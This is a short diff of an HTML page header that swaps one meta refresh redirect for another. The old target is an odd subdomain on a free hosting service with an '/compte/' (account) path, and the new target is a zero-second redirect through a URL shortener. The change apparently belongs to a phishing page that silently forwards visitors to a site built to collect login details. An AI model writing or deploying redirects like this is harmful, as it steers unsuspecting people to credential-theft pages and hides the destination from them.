@@ -1,2 +1,2 @@
-<meta http-equiv="refresh" content="1; URL=https://couleurtropicalencours.u882744w5a.ha004.t.justns.ru/compte/">
+<meta http-equiv="refresh" content="0; URL=https://ume.la/vdX9xX">
 </head>
